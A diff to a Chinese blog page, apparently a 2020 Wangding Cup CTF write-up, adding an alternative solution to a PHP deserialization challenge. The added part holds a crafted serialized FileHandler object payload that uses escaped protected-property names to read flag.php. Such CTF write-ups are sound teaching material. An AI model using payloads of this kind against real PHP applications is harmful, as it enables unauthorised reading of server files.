@@ -113,6 +113,15 @@
 <p>另外如果把3改成2的话也是可以读的</p>
 <p><img src="/2020/05/10/2020%E5%B9%B4%E7%BD%91%E9%BC%8E%E6%9D%AFwriteup/image-20200511095452622.png" alt="image-20200511095452622"></p>
 <p>phpstudy7.2.10外其他版本均读不了flag文件。</p>
+<p>后来看到p神之前分享过</p>
+<blockquote>
+<p><img src="/2020/05/10/2020%E5%B9%B4%E7%BD%91%E9%BC%8E%E6%9D%AFwriteup/image-20200511215419050.png" alt="image-20200511215419050"></p>
+<p><a href="https://blog.csdn.net/a3320315/article/details/105215741" target="_blank" rel="noopener">参考</a></p>
+</blockquote>
+<p>然后还有一种解法</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O:<span class="number">11</span>:<span class="string">"FileHandler"</span>:<span class="number">3</span>:&#123;S:<span class="number">5</span>:<span class="string">"\00*\00op"</span>;i:<span class="number">2</span>;S:<span class="number">11</span>:<span class="string">"\00*\00filename"</span>;s:<span class="number">8</span>:<span class="string">"flag.php"</span>;S:<span class="number">10</span>:<span class="string">"\00*\00content"</span>;N;&#125;</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/05/10/2020%E5%B9%B4%E7%BD%91%E9%BC%8E%E6%9D%AFwriteup/image-20200511215516506.png" alt="image-20200511215516506"></p>
 <h1 id="0x02-filejava"><a href="#0x02-filejava" class="headerlink" title="0x02 filejava"></a>0x02 filejava</h1><p>上传完文件可以看下载文件处有任意文件读取漏洞，</p>
 <p><img src="/2020/05/10/2020%E5%B9%B4%E7%BD%91%E9%BC%8E%E6%9D%AFwriteup/image-20200510214503572.png" alt="image-20200510214503572"></p>
 <p>都配置文件</p>
